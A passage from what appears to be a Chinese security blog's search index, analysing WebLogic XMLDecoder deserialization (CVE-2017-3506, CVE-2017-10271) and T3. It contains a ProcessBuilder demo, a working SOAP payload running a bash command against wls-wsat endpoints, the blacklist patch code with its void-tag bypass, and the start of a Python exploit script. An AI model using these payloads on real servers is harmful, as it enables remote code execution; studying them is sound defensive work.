\u7684\u610f\u601d\u5c31\u662f\u8868\u793a\u4e00\u6bb5\u503c\u4e3aaaa\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u6807\u7b7e\u4e00\u822c\u4e0e\u5176\u4ed6\u6807\u7b7e\u4e00\u8d77\u7528\u6765\u8fbe\u5230\u4e00\u4e9b\u6548\u679c object object\u6807\u7b7e\u8868\u793a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5176class\u5c5e\u6027\u6307\u5b9a\u7c7b\u540d\uff0cmethod\u5c5e\u6027\u6307\u5b9a\u67d0\u65b9\u6cd5\u540d\uff08\u6784\u9020\u65b9\u6cd5\u65b9\u6cd5\u540d\u4e3anew\uff09 \u5982 new A(\"test\"); \u7684xml\u6587\u6863\u8868\u73b0\u4e3a <object class=\"A\" method=\"new\"> <string>test</string> </object> void void\u4e00\u822c\u4e0e\u5176\u4ed6\u6807\u7b7e\u642d\u914d\u4f7f\u7528\uff0c\u5b83\u4e5f\u6709method\uff0cclass\u7b49\u5c5e\u6027\uff0c\u4e8e\u662f\u5b83\u548cobject\u6807\u7b7e\u5341\u5206\u76f8\u50cf\u3002 void\u4e00\u822c\u7528\u4e8e\u51fd\u6570\u8c03\u7528\u5e76\u901a\u8fc7method\u5c5e\u6027\u6307\u5b9a\u65b9\u6cd5\u540d\uff0c\u4ee5\u53ca\u5176\u4ed6\u8f85\u52a9\u4f5c\u7528\uff08\u5982array\u6807\u7b7e\u4e2d\u5145\u5f53\u7d22\u5f15\uff09 \u5982A a = new A(); A.foo(\"test\"); \u7684xml\u6587\u6863\u8868\u73b0\u4e3a <object class=\"A\"> <void method=\"foo\"> <string>test</string> </void> </object> array array\u6807\u7b7e\u7528\u4e8e\u8868\u793a\u6570\u7ec4\uff0cclass\u5c5e\u6027\u6307\u5b9a\u7c7b\u540d\uff0c\u5185\u90e8\u901a\u8fc7void\u6807\u7b7e\u7684index\u5c5e\u6027\u8bbe\u7f6e\u7d22\u5f15 \u5982 String[] a = new String[];s[1]=\"test\" \u7684xml\u8868\u73b0\u5f62\u5f0f\u4e3a <array class=\"java.lang.String\"> <void index=\"1\"> <string>test</string> </void> </array> \u5de5\u4f5c\u539f\u7406 \u4e0d\u540c\u7684XML\u6807\u7b7e\u5bf9\u5e94\u7740\u4e0d\u540c\u7684handler\uff0c\u4e5f\u5c31\u5bf9\u5e94\u7740\u4e0d\u540c\u7684\u5904\u7406\u673a\u5236\u3002 \u5927\u591a\u6570handler\u90fd\u6709addAttribute\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u63d0\u53d6\u6807\u7b7e\u4e2d\u7684\u5c5e\u6027\u5e76\u8fdb\u884c\u5904\u7406\uff1b \u4ee5\u53cagetValueObject\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u83b7\u53d6\u6807\u7b7e\u7684\u503c\u3002 \u9996\u5148\u4ee5java\u6807\u7b7e\u4e3a\u4f8b\uff1avar1\u5bf9\u5e94\u7740\u5c5e\u6027\u540d\uff0cvar2\u5bf9\u5e94\u7740\u5c5e\u6027\u503c\u3002java\u6807\u7b7e\u4f1a\u6839\u636eclass\u5c5e\u6027\u4e2d\u7684\u503c\u8fdb\u884c\u7c7b\u52a0\u8f7d\u3002 \u518d\u6765\u770b\u770bNew\u6807\u7b7e\uff1a\u548cjava\u6807\u7b7e\u7684handler\u7c7b\u4f3c\uff0c\u5b83\u4e5f\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\u64cd\u4f5c\uff0c\u4e0d\u8fc7NewElementHandler\u662f\u8bb8\u591ahandler\u7684\u7236\u7c7b\uff08\u5982ArrayElementHandler\uff0cObjectElementHandler\uff09\uff0c\u8fd9\u5c31\u610f\u5473\u7740NewElementHandler\u7684\u5b50\u7c7b\u4e5f\u53ef\u4ee5\u8fdb\u884c\u7c7b\u52a0\u8f7d \u5728\u4e0a\u6587\u4e2d\u63d0\u5230object\u6807\u7b7e\u6709\u8fdb\u884c\u7c7b\u52a0\u8f7d\u7684\u80fd\u529b\uff0c\u662f\u56e0\u4e3a\u5176class\u5c5e\u6027\u662f\u7531\u7236\u7c7bNewElementHandler\u8fdb\u884c\u5904\u7406\u7684\u3002 \u800cvoid\u6807\u7b7e\u4e4b\u6240\u4ee5\u548cobject\u6807\u7b7e\u5982\u6b64\u76f8\u50cf\u7684\u539f\u56e0\u662f\uff0cVoidElementHandler\u7ee7\u627f\u81eaObjectElementHandler\uff0c\u4e14\u4ec5\u91cd\u5199\u4e86\u4e00\u4e2aisArgument\u65b9\u6cd5\uff0c\u5176\u5b83\u90fd\u548c\u7236\u7c7b\u4e00\u6837\u3002 \u518d\u6765\u770b\u770barray\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u6807\u7b7e Demo\u8c03\u8bd5 \u4ece\u4e0a\u6587\u5927\u6982\u77e5\u9053XMLDecoder\u5904\u7406xml\u7684\u6d41\u7a0b\u4e3a :XMLDecoder.readObject() ->xerces\u89e3\u6790->DocumentHandler\u4e8b\u4ef6\u5904\u7406\uff0c\u90a3\u4e0d\u5982\u5199\u4e2aDemo\u8c03\u8bd5\u4e00\u4e0b\u770b\u770b\u5177\u4f53\u8fc7\u7a0b\u5982\u4f55 import java.beans.XMLDecoder; import java.io.*; public class Main { public static void main(String[] args) throws FileNotFoundException { String s = \"<java version=\\\"1.7.0_80\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \" <object class=\\\"java.lang.ProcessBuilder\\\">\\n\" + \" <array class=\\\"java.lang.String\\\" length=\\\"1\\\">\\n\" + \" <void index=\\\"0\\\"><string>calc</string></void>\\n\" + \" </array>\\n\" + \" <void method=\\\"start\\\"></void>\\n\" + \" </object>\\n\" + \"</java>\"; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s); XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream); Object o = xmlDecoder.readObject(); System.out.println(o); } } \u76f4\u63a5\u5f00\u59cb\u52a8\u8c03\uff0c\u5728demo\u4e2dxmlDecoder.readObject() \u5904\u4e0b\u65ad\u70b9\u3002\u8ddf\u8fdb\u3002 readObject \u8ddf\u8fdbreadObject,\u53ef\u4ee5\u53d1\u73b0\u8c03\u7528\u4e86parsingComplete(),\u7ee7\u7eed\u8ddf\u8fdb java.beans.XMLDecoder#parsingComplete, \u56e0\u4e3a\u6211\u4eec\u8ddf\u8e2a\u7684\u662f\u5bf9XML\u7684\u89e3\u6790\u8fc7\u7a0b\uff0c\u6240\u4ee5\u8fd9\u4e2aparse\u65b9\u6cd5\u5c31\u5f88\u53ef\u7591\uff0c\u800c\u4e14\u53c8\u56e0\u4e3a\u662f\u53ef\u8ddf\u8fdb\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u8ddf\u8fdb com.sun.beans.decoder.DocumentHandler#parse,\u53c8\u53d1\u73b0\u4e00\u4e2aparse\uff0c\u8ddf\u8fdb com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,\u53c8\u627e\u5230\u4e00\u4e2aparse\uff0c\u8ddf\u8fdb com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse\uff0c\u53d1\u73b0\u8ddf\u8fdb\u6765\u7684\u8fd9\u4e2aparse\u662f\u91cd\u8f7d\u65b9\u6cd5\uff0c\u5728\u5176\u4e2d\u53c8\u53d1\u73b0\u4e86parse\uff0c\u518d\u8ddf com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,\u53d1\u73b0parse\uff0c\u53c8\u8ddf com.sun.org.apache.xerces.internal.parsers.XMLParser#parse com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,\u4e0a\u4e00\u4e2aparse\u7684\u91cd\u8f7d\uff0c\u5176\u4e2d\u8c03\u7528\u4e86\u4e00\u4e2a\u53ebscanDocument\u7684\u65b9\u6cd5 \u8ddf\u8fdbscanDocument\uff0c\u5230\u8fd9\u91cc\u5c31\u5df2\u7ecf\u8fdb\u5165\u4e86xerces\u89e3\u6790\u4e86\u3002\u8fd9\u91cc\u6709\u4e2ado..while\u5faa\u73af\uff0c\u4f5c\u7528\u662f\u63d0\u53d6XML\u6807\u7b7e \u8c03\u7528\u94fe: ScanDocument \u6211\u4eec\u6765\u770b\u4e00\u4e0bscanDocument\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u8fd9\u91cc\u5faa\u73af\u6267\u884c\u4e86next()\u65b9\u6cd5\uff0c\u5728\u524d\u5341\u51e0\u4e2a\u5faa\u73af\u91cc\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5bf9XML\u8fdb\u884c\u4e86\u89e3\u6790\u548c\u4e8b\u4ef6\u5904\u7406\u3002\u5927\u81f4\u7684\u5904\u7406\u6d41\u7a0b\u662f\u5bf9\u6bcf\u4e00\u4e2a\u89e3\u6790\u5230\u7684\u6807\u7b7e\u5148\u5b9e\u4f8b\u5316\u5bf9\u5e94\u7684handler\uff0c\u7136\u540e\u5faa\u73af\u8c03\u7528addAttribute\u65b9\u6cd5\u83b7\u53d6\u5176\u6240\u6709\u5c5e\u6027\u5e76\u8fdb\u884c\u4e00\u5b9a\u7684\u4e8b\u4ef6\u5904\u7406\uff0c\u5f53\u89e3\u6790\u5230\u67d0\u4e2a\u6807\u7b7e\u7684\u7ed3\u675f\u6807\u7b7e\u65f6(\u5982\\ ) \u4fbf\u4f1a\u8c03\u7528getValueObject \u83b7\u53d6\u6807\u7b7e\u4e2d\u7684\u503c\u7684\u4fe1\u606f\u3002\u8fd9\u91cc\u501f\u7528\u4e00\u4e2a\u56fe public boolean scanDocument(boolean complete) throws IOException, XNIException { this.fEntityManager.setEntityHandler(this); int event = this.next(); do { switch(event) { case 1: case 2: case 6: .................. case 12: this.fDocumentHandler.startCDATA((Augmentations)null); this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null); this.fDocumentHandler.endCDATA((Augmentations)null); event = this.next(); \u4e0b\u9762\u7684\u8c03\u8bd5\u6211\u5bf9XML\u4e2d\u6240\u6d89\u53ca\u7684\u6240\u6709handler\u7684\u6240\u6709\u65b9\u6cd5\u5747\u4e0b\u4e86\u65ad\u70b9\u4ee5\u65b9\u4fbf\u8c03\u8bd5\u3002 \u6211\u4eecXML\u4e2d\u7b2c\u4e00\u4e2a\u6807\u7b7e\u662fJAVA\uff0c\u4e8e\u662f\u6211\u4eec\u5728JavaElementHandler\u5404\u65b9\u6cd5\u4e0b\u65ad\u70b9\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0next\u65b9\u6cd5\u5185\u90e8\u4f1a\u5148\u5b9e\u4f8b\u5316JavaElementHandler\uff0c\u7136\u540e\u8c03\u7528addAttribute\uff0c\u5c06\u83b7\u53d6\u7684\u7c7b\u5bf9\u8c61(java.beans.XMLDecoder)\u7f6e\u5165this\u3002 \u7136\u540e\u81ea\u7136\u662f\u89e3\u6790object\u6807\u7b7e\uff0c\u7531\u4e8eObjectElementHandler\u672a\u5b9a\u4e49\u5bf9class\u5c5e\u6027\u7684\u89e3\u6790\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528\u7236\u7c7bNewElementHandler\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\uff0c\u5c06\u83b7\u53d6\u7684\u7c7b\u5bf9\u8c61(java.lang.ProcessBuilder)\u7f6e\u5165this \u5c31\u8fd9\u6837 \u5f97\u5230\u6807\u7b7e->\u5b9e\u4f8b\u5316Handler->\u5faa\u73af\u6807\u7b7e\u5c5e\u6027\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406 \uff0c\u76f4\u5230\u89e3\u6790\u5230\u7b2c\u4e00\u4e2a\u672b\u6807\u7b7e(EndElement)\\ ,\u4fbf\u4f1a\u6267\u884cStringElementHandler#getValueObject\uff0c\u8fd4\u56de\u88abValueObjectImpl.create\u5904\u7406\u8fc7\u7684\u6807\u7b7e\u5185\u7684\u503c\u3002 \u7136\u540e\u63a5\u4e0b\u6765\u4f1a\u628a\u8fd9\u4e2aValueObjectImpl\u5bf9\u8c61\u8d4b\u503c\u5230\u7236\u6807\u7b7e\u5bf9\u5e94\u7684handler\u7684\u5c5e\u6027\u91cc \u800c\u89e3\u6790\u5230\\ \\ calc\\ \\ \u7684\\ \u65f6\uff0c\u4f1a\u6839\u636eif\u903b\u8f91\u5224\u65ad\u8fd9\u91ccvoid\u6807\u7b7e\u7684\u4f5c\u7528\uff0c\u8fd9\u91cc\u5224\u65ad\u7684void\u8d77\u5230\u4e00\u4e2a\u6570\u7ec4\u5143\u7d20\u8d4b\u503c\u7684\u4f5c\u7528\uff0c\u4e8e\u662f\u4fbf\u901a\u8fc7set\u65b9\u6cd5\u5f80Array\u8d4b\u503c\u3002 \u5728\u89e3\u6790\u5230\\ \\ \u7684\u672b\u6807\u7b7e\\ \u65f6\uff0c\u5b83\u7684\u903b\u8f91\u662f\u8fd9\u6837\u7684\uff0c\u5148\u83b7\u53d6\u7236handler\u5bf9\u5e94type\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u5bf9\u5176\u4f7f\u7528start\u65b9\u6cd5 \u5982\u679c\u6211\u4eec\u8ddf\u8fdb\u8fd9\u4e2agetContextBean\u5c31\u4f1a\u6765\u5230\u8fd9\u91cc\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8c03\u7528\u94fe\u7236handler\u5373ObjectElementHandler\u7684getValueObject \u8ddf\u8fdb\u770b\u770b\u7236handler\u7684getValueObject\u903b\u8f91\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd4\u56de\u4e86\u4e00\u4e2anew ProcessBuilder(\"calc\"). calc\u5b57\u6bb5\u5728var5.argument\u4e2d\uff0c\u622a\u56fe\u4e2d\u6ca1\u6709\u622a\u51fa\u6765\u3002 \u56de\u5230\u672chandler\uff0c\u901a\u8fc7\u62fc\u63a5\uff0c\u6267\u884c\u4e86new ProcessBuilder(\"calc\").start(); \u5f39\u51fa\u8ba1\u7b97\u5668\u3002 \u603b\u7ed3 \u5f53xml\u6570\u636e\u4f20\u5165\u5230XMLDecoder.readObejct\u540e\u7ecf\u8fc7\u4e00\u4e9b\u5904\u7406\u4f1a\u4f20\u5165\u5230scanDocument\u65b9\u6cd5\u91cc\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u5faa\u73af\u89e3\u6790XML\u6807\u7b7e\u5e76\u4ea4\u7531\u76f8\u5e94\u7684Handler\u8fdb\u884c\u5904\u7406\uff0c\u4e14\u5b50\u6807\u7b7e\u7684handler\u5bf9\u7236\u6807\u7b7e\u7684handler\u7531\u94fe\u8868\u7ed3\u6784\u4e32\u8054\u8d77\u6765\uff0c\u6240\u4ee5\u6bcf\u89e3\u6790\u4e00\u4e2a\u6807\u7b7e\u5c31\u4f1a\u5f80\u8fd9\u4e2a\u94fe\u8868\u7ed3\u6784\u589e\u6dfb\u65b0\u5143\u7d20\u5e76\u8fdb\u884c\u4e00\u4e9b\u4e8b\u4ef6\u5904\u7406\u3002 \u4ece\u5b89\u5168\u65b9\u9762\u800c\u8a00\uff0c\u4fbf\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4f20\u5165\u6076\u610fXML\u6570\u636e\u4ea4\u7531XMLDecoder\u8fdb\u884c\u89e3\u6790\uff0cXMLDecoder\u4f1a\u5faa\u73af\u904d\u5386XML\u6570\u636e\u5e76\u8fdb\u884c\u62fc\u63a5\u5904\u7406\uff0c\u76f4\u5230\u6700\u540e\u62fc\u63a5\u51fa\u5b8c\u6574\u7684\u6076\u610f\u8bed\u53e5\u5e76\u6267\u884c\u3002 CVE-2017-3506\\&CVE-2017-10271 \u5f71\u54cd\u8303\u56f4 WebLogic 10.3.6.0 WebLogic 12.1.3.0 WebLogic 12.2.1.0 WebLogic 12.2.1.1 WebLogic 12.2.1.2 \u8be5\u6f0f\u6d1e\u5229\u7528weblogic\u7684wls-wsat\u7ec4\u4ef6\u5bf9XML\u7528XMLDecoder\u8fdb\u884c\u89e3\u6790\u7684\u529f\u80fd\uff0c\u4ece\u800c\u5bf9\u5176\u4f20\u5165\u6076\u610fXML\u6570\u636e\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002 \u590d\u73b0\u5206\u6790\u5982\u4e0b [*] wls-wsat\u7ec4\u4ef6\u8def\u5f84\uff1a /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/ParticipantPortType /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationPortTypeRPC /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/RegistrationRequesterPortType /wls-wsat/RegistrationRequesterPortType1 \u5bf9weblogic\u8def\u7531 http://xxx:7001/wls-wsat/CoordinatorPortType \u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305 <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>touch /tmp/1234</string> </void> </array> <void method=\"start\"/></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u5e76\u4fee\u6539content-type \u6211\u8fd9\u91cc\u76f4\u63a5\u5728javaElementHandler#addAttribute \u4e0b\u65ad\u70b9\u7136\u540e\u89c2\u5bdf\u5806\u6808\u4fe1\u606f \u53ef\u4ee5\u53d1\u73b0\u662fWorkContextXmlInputAdapter#readUTF \u5904\u8c03\u7528\u4e86xmlDecoder\u7684readObject\u65b9\u6cd5\u3002\u6211\u4eec\u7684XML\u5c31\u8fd9\u6837\u4f20\u8fdb\u53bb\u7545\u901a\u65e0\u963b\u7684\u8fdb\u5165\u4e86XMLDecoder\u7684\u89e3\u6790\u3002 \u653b\u51fb\u7ed3\u679c CVE-2017-3506 \u4fee\u8865\u65b9\u6848\u4e3a\u91c7\u7528\u9ed1\u540d\u5355\u673a\u5236\u7981\u7528\u4e86object\u6807\u7b7e\uff0c\u8fd9\u7b80\u76f4\u4e0d\u8981\u592a\u597d\u7ed5\uff0c\u6240\u4ee5CVE-2017-10271\u6765\u4e86\u3002 \u8fd9\u662f\u9ed1\u540d\u5355\u6821\u9a8c\u7684\u76f8\u5173\u4ee3\u7801\u3002 private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid context type: object\"); } } }); } catch (ParserConfigurationException var5) { throw new IllegalStateException(\"Parser Exception\", var5); } catch (SAXException var6) { throw new IllegalStateException(\"Parser Exception\", var6); } catch (IOException var7) { throw new IllegalStateException(\"Parser Exception\", var7); } } \u7ed5\u8fc7\u5c31\u662f\u628aobject\u6807\u7b7e\u6539\u4e3avoid\u6807\u7b7e\u5c31\u884c\u4e86\uff0c\u56e0\u4e3a\u4ece\u4ee3\u7801\u5c42\u9762\u6765\u770b\uff0cvoid\u548cobject\u7684handler\u56e0\u4e3a\u662f\u7236\u5b50\u7c7b\u5173\u7cfb\uff0c\u6240\u4ee5\u903b\u8f91\u662f\u9ad8\u5ea6\u76f8\u540c\u7684\u3002 CVE-2017-10271\u7684\u8865\u4e01\u5219\u662f\u7ee7\u7eed\u628a\u9ed1\u540d\u5355\u8865\u5168\uff0c\u53ef\u89c1\u9664\u4e86object\uff0c\u8fd8\u6709method\uff0cnew\uff0carray\u7b49\u6807\u7b7e\u90fd\u88ab\u505a\u4e86\u5904\u7406\u3002 object\uff0cnew\uff0cmethod\u6807\u7b7e\u76f4\u63a5\u88abban\uff0cvoid\u5c5e\u6027\u53ea\u80fd\u8bbe\u7f6eindex\uff0carray\u7684class\u53ea\u80fd\u8bbe\u7f6e\u4e3abyte\u7c7b\u578b\u3002 private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid element qName:object\"); } else if(qName.equalsIgnoreCase(\"new\")) { throw new IllegalStateException(\"Invalid element qName:new\"); } else if(qName.equalsIgnoreCase(\"method\")) { throw new IllegalStateException(\"Invalid element qName:method\"); } else { if(qName.equalsIgnoreCase(\"void\")) { for(int attClass = 0; attClass < attributes.getLength(); ++attClass) { if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) { throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass)); } } } if(qName.equalsIgnoreCase(\"array\")) { String var9 = attributes.getValue(\"class\"); if(var9 != null && !var9.equalsIgnoreCase(\"byte\")) { throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); } \u76f4\u63a5\u7ed5\u5b83\u7684\u9ed1\u540d\u5355\u7684\u8bdd\uff0c\u6709\u5982\u4e0b\u601d\u8def \" \u4f7f\u7528class\u6807\u7b7e\u6784\u9020\u7c7b\uff0c\u4f46\u662f\u7531\u4e8e\u9650\u5236\u4e86method\u51fd\u6570\uff0c\u65e0\u6cd5\u8fdb\u884c\u51fd\u6570\u8c03\u7528\uff0c\u53ea\u80fd\u4ece\u6784\u9020\u65b9\u6cd5\u4e0b\u624b\uff0c\u4e14\u53c2\u6570\u4e3a\u57fa\u672c\u7c7b\u578b\uff1a \u6784\u9020\u51fd\u6570\u6709\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u6587\u4ef6\u540d\u548c\u5185\u5bb9\u53ef\u63a7\uff0c\u53ef\u4ee5\u8fdb\u884cgetshell\u3002 \u6784\u9020\u51fd\u6570\u6709\u5176\u4ed6\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u6784\u9020\u51fd\u6570\u76f4\u63a5\u6709\u6267\u884c\u547d\u4ee4\u7684\u64cd\u4f5c\uff0c\u6267\u884c\u547d\u4ee4\u53ef\u63a7\u3002 \u6709\u5176\u5b83\u7684\u53ef\u80fd\u5bfc\u81f4rce\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u8868\u8fbe\u5f0f\u6ce8\u5165\u4e4b\u7c7b\u7684\u3002 \u76ee\u524d\u5b58\u5728\u7684\u5229\u7528\u94fe\u6709\uff1a FileSystemXmlApplicationContext-RCE UnitOfWorkChangeSet-RCE ysoserial-jdk7u21-RCE JtaTransactionManager-JNDI\u6ce8\u5165","title":"\u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#weblogic","text":"","title":"\u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","text":"T3\u534f\u8bae \u6293\u5305\u5206\u6790 CVE-2015-4852 \u5206\u6790 resolveClass XMLDecoder apache xerces DocumentHandler \u5de5\u4f5c\u539f\u7406 Demo\u8c03\u8bd5 readObject ScanDocument \u603b\u7ed3 CVE-2017-3506\\&CVE-2017-10271 \u5148\u5f15\u7528\u4e00\u4e0b\u5947\u5b89\u4fe1\u56e2\u961f\u53d1\u51fa\u7684weblogic\u5386\u53f2\u6f0f\u6d1e\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u4ee5\u53cd\u5e8f\u5217\u5316\u4e3a\u4e3b\uff0c\u53cd\u5e8f\u5217\u5316\u95ee\u9898\u4e3b\u8981\u6765\u81eaXMLDecoder\u548cT3\u534f\u8bae","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#t3","text":"weblogic t3\u534f\u8bae\u5c31\u662fweblogic\u7684rmi\u6240\u4f7f\u7528\u7684\u534f\u8bae\u3002 \u5728\u4f20\u7edfjava\u4e2d\uff0crmi\u4f7f\u7528\u7684\u662fjrmp\u534f\u8bae\u3002 JRMP\u534f\u8bae\u7684\u901a\u4fe1\u7531\u5982\u4e0b\u90e8\u5206\u6784\u6210 \u5ba2\u6237\u7aef\u5bf9\u8c61 \u670d\u52a1\u7aef\u5bf9\u8c61 \u5ba2\u6237\u7aef\u4ee3\u7406\u5bf9\u8c61\uff08stub\uff09 \u670d\u52a1\u7aef\u4ee3\u7406\u5bf9\u8c61\uff08skeleton\uff09 \u800cT3\u534f\u8bae\u5728JRMP\u534f\u8bae\u4e0a\u505a\u51fa\u4e86\u6539\u8fdb\uff0cstub\u548cskeleton\u90fd\u662f\u52a8\u6001\u751f\u6210\u7684\uff0c\u5c06\u5bf9\u8c61\u90e8\u7f72\u5230RMI\u6ce8\u518c\u4e2d\u5fc3\u65f6weblogic\u4f1a\u81ea\u52a8\u751f\u6210stub\u548cskeleton\u3002 Weblogic\u4e4b\u6240\u4ee5\u5f00\u53d1T3\u534f\u8bae\uff0c\u662f\u56e0\u4e3a\u4ed6\u4eec\u9700\u8981\u53ef\u6269\u5c55\uff0c\u9ad8\u6548\u7684\u534f\u8bae\u6765\u4f7f\u7528Java\u6784\u5efa\u4f01\u4e1a\u7ea7\u7684\u5206\u5e03\u5f0f\u5bf9\u8c61\u7cfb\u7edf","title":"T3\u534f\u8bae"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_2","text":"\u6211\u4eec\u60f3\u6293\u5305\u5206\u6790T3\u534f\u8bae\u6709\u4e24\u4e2a\u65b9\u6cd5 1.\u5199\u4e00\u4e2aT3 rmi server\u548c\u4e00\u4e2aT3 rmi client\uff0c\u542f\u52a8client\u53bb\u8bf7\u6c42rmi server\uff0c\u4ece\u800c\u5b9e\u73b0\u6293\u5305\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8be6\u7ec6\u6b65\u9aa4\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8 2.\u4f7f\u7528python\u6a21\u62dfclient\u53d1\u5305\uff0c\u4ece\u800c\u5b9e\u73b0T3\u534f\u8bae\u6293\u5305\u5206\u6790\u3002\u8fd9\u4e2a\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u5bb9\u6613\uff0c\u6211\u4eec\u5c31\u901a\u8fc7\u8be5\u65b9\u6cd5\u6765\u4e00\u7aa5T3\u534f\u8bae\u7684\u5965\u5999\u3002 https://xz.aliyun.com/t/10365#toc-1\u73af\u5883\u7684\u642d\u5efa\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u5728\u5b8c\u6210\u73af\u5883\u642d\u5efa\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u5982\u4e0bexp from os import popen import struct # \u8d1f\u8d23\u5927\u5c0f\u7aef\u7684\u8f6c\u6362 import subprocess from sys import stdout import socket import re import binascii def generatePayload(gadget,cmd): YSO_PATH = 